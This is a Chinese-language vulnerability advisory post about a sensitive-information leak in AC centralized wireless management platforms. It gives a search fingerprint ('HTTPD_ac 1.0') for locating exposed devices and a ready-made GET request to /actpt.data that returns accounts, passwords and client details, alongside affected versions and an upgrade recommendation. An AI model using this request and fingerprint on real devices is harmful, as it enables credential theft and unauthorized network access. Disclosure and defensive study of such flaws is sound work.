#  AC集中管理平台敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-06 02:54  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# AC集中管理平台敏感信息泄漏漏洞  
#   
  
02  
  
—  
  
影响版本  
  
**影响版本：大唐电信AC集中管理平台影响版本为早期未修复的版本、D-Link AC集中管理平台影响版本为<= 1.02.042、secnet安网智能AC管理系统影响版本为<= 1.02.042**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2LeLYgQewjoiaaB1cswrYK2C14wCv4zJf6ITmONVbIiaicCG3Vicnt4ILy8p9ibPmn9dDibianCFcagw9GZaJI2UicMbHyic9m2T6dOFxI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0icAv6DjXicquFXTqAiaFWKMSHSgLrkdNOMMUPjapicO3X8icjic3Dfiaz6ticO6ZyrYa96ibhCoLRicic35udN5Wrd9Jy1FHibgOfEhbic714/640?wx_fmt=png&from=appmsg "")  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0QfhhLuS512oQNAnNBG1L0W8QdLS7ogENcE2het3kLNsZNJ7sQyyuacw8DfOsngT7CrUzubnhfjpemQB5ejX5zjNs5GLP4azY/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0TAmltQPB5zibIX5gZy9cEfgIK7EqHp9ibiaicqMGIE07uC9KhnysGUKOuZ8SzpTGZqbmuI8l1zWhWPqHlTsqYuHZ4Q2J9ic0P5QcQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
AC集中管理平台是一种用于集中管理和控制无线网络中接入点设备的系统平台，主要应用于企业、园区、校园等大规模无线网络场景。该平台通过与无线控制器及A  
P设备协同工作，实现对多台AC和大量AP的统一配置、监控、运维和管理，具备集中配置下发、分级分权管理、AC集群负载均衡、故障自动切换、网络性能优化等功能，可显著提升无线网络的管理效率、可靠性与稳定性，降低运维成本  
。  
AC集中管理平台存在敏感信息泄露漏洞，攻击者可通过特定请求（如访问/actpt.data  
）获取网关敏感信息，包括账号、密码、用户IP和MAC地址等。  
  
04  
  
—  
  
资产测绘  
```
header="HTTPD_ac 1.0"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3hIbPJm07iaR9zQTX6T7qBRUiaVU93WnFFKNbZSa69icyfDeAt9YxaawpZjJMRL1Y7YN3pacwnbPNJCkTysHWjw24wxZMzdyia3icA/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /actpt.data HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate

Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0vM74ku95ibFbUic4ROCAAo60FzBx32HBQKbIZZC1AKcjZEm8ezctuXr9dWm2064ZEf7JFRUbiclemiaq6nsRBhcewMqYnAIpqLjo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0Yzia0HWklzzJgHCFjNribAsoXBibuUuNicZDBomicULDp1OAlibwVE07Jp6JicEl5j4h76cEzY4aQTOlBicpPs19QMfXFsuHdriaZxib24/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级AC集中管理平台软件至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
